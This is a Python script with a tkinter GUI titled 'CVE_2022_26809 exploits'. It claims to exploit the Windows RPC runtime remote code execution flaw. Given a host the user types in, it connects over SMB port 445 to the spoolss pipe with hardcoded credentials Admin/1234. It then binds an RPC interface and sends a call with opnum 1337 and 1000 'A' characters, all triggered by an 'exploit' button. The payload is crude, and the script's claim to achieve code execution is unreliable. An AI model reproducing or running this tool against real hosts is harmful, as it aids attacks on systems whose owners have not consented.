'''
Remote Procedure Call Runtime Remote Code Execution Vulnerability
'''
from impacket.dcerpc.v5.rpcrt import *
from impacket import uuid
from impacket.dcerpc.v5 import transport
from tkinter import *
import tkinter
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
root = tkinter.Tk()
root.title("CVE_2022_26809 exploits")
root.geometry('800x600+0+0')
def printInput():
    inp = inputtxt.get(1.0, "end-1c")
    lbl.config(text = "attack url : "+inp)
    host = inp
    scroll_y = Scrollbar(root, orient=VERTICAL)
    txtarea = Text(root, yscrollcommand=scroll_y.set, font=(
            "times new roman", 15, "bold"), fg="#3206b8")
    scroll_y.pack(side=RIGHT, fill=Y)
    scroll_y.config(command=txtarea.yview)
    binding = "ncacn_np:%(host)s[\\pipe\\%(pipe)s]"
    binding %= {'host':''+host,'pipe': 'spoolss', 'port': 445}

    #print("Using binding: %r "%binding)
    txtarea.insert(END, "Using binding: %r "%binding)
    txtarea.insert(END, "\n----------------------------------------------------------------------------------\n")

    trans = transport.DCERPCTransportFactory(binding)
    trans.set_dport(445)
    trans.set_credentials('Admin','1234')
    trans.connect()

    dce = trans.DCERPC_class(trans)
    dce.set_auth_level(RPC_C_AUTHN_LEVEL_NONE)
    dce.set_max_tfrag(1024)
    dce.set_auth_level(RPC_C_AUTHN_LEVEL_CONNECT)
    #print("concted to SMB")
    txtarea.insert(END, "concted to SMB")
    txtarea.insert(END, "\n----------------------------------------------------------------------------------\n")

    dce.bind(uuid.uuidtup_to_bin(('0b6edbfa-4a24-4fc6-8a23-942b1eca65d1','1.0')))

    dce.call(1337, "A" * 1000)

    #print(dce.recv())
   # print(dce.disconnect())
    txtarea.insert(END, dce.recv())
    txtarea.insert(END, "\n----------------------------------------------------------------------------------\n")
    txtarea.insert(END, dce.disconnect())
    txtarea.pack(fill=BOTH, expand=1)
Hacher = Label(root, text="Remote Procedure Call Runtime Remote Code Execution Vulnerability").pack()
Hacher = Label(root, text="Enter url or domin www.example.com : ").pack()
inputtxt = tk.Text(root,height = 1,width = 80)
inputtxt.pack()
printButton = tk.Button(root,text = "exploit", command = printInput)
printButton.pack()
lbl = tk.Label(root, text = "")
lbl.pack()
root.mainloop()
